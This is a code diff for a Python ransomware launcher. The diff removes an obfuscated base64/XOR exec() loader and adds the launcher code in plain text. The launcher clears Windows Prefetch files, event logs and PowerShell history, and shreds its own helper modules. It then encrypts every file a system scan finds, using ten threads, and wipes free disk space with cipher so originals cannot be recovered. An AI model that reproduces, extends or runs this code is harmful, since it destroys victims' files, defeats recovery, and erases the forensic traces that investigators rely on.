@@ -1,9 +1,97 @@
-import base64
-def _x(d,k):
-    r=[]
-    for i,c in enumerate(d):
-        r.append(chr(ord(c)^ord(k[i%len(k)])))
-    return ''.join(r)
-_k="3e26bf64d5a1668f"
-_c=base64.b64decode("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").decode()
-exec(_x(_c,_k))
+import os
+import sys
+import time
+import threading
+import shutil
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+if getattr(sys, 'frozen', False):
+    SCRIPT_DIR = os.path.dirname(sys.executable)
+else:
+    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+
+os.chdir(SCRIPT_DIR)
+
+
+def pre_cleanup():
+    try:
+        os.system('powershell -w h -nop -c "Remove-Item C:\\Windows\\Prefetch\\*.pf -Force" 2>nul')
+        os.system('wevtutil cl Application 2>nul')
+        os.system('wevtutil cl System 2>nul')
+        ps_history = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
+        if os.path.exists(ps_history):
+            open(ps_history, 'w').close()
+    except:
+        pass
+
+
+def auto_destruir_archivos():
+    archivos = ['evasion_av.py', 'rutas.py', 'encriptador_12_capas.py', 'launcher.py', 'launcher.bat', 'launcher.sh']
+    for f in archivos:
+        if os.path.exists(f):
+            try:
+                size = os.path.getsize(f)
+                with open(f, 'wb') as fw:
+                    fw.write(os.urandom(size))
+                os.remove(f)
+            except:
+                pass
+
+
+def cleanup_python_thread():
+    time.sleep(300)
+    try:
+        if os.path.exists('python_portable'):
+            shutil.rmtree('python_portable')
+    except:
+        pass
+
+
+try:
+    from evasion_av import verificar_seguridad_total
+except:
+    verificar_seguridad_total = lambda: True
+
+try:
+    from rutas import escanear_sistema
+    from encriptador_12_capas import EncriptadorMilitar
+except ImportError:
+    sys.exit(1)
+
+
+def encriptar_archivo(enc, ruta):
+    try:
+        result = enc.encriptar(ruta)
+        if result:
+            try:
+                dirname = os.path.dirname(ruta)
+                os.system(f'cipher /w:"{dirname}" 2>nul')
+            except:
+                pass
+        return result
+    except:
+        return False
+
+
+def main():
+    try:
+        pre_cleanup()
+        threading.Thread(target=cleanup_python_thread, daemon=True).start()
+        os.chdir(SCRIPT_DIR)
+        archivos, _, _ = escanear_sistema()
+        enc = EncriptadorMilitar()
+        auto_destruir_archivos()
+        NUM_THREADS = 10
+        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
+            futures = {executor.submit(encriptar_archivo, enc, ruta): ruta for ruta in archivos}
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except:
+                    pass
+    except:
+        pass
+
+
+if __name__ == "__main__":
+    main()
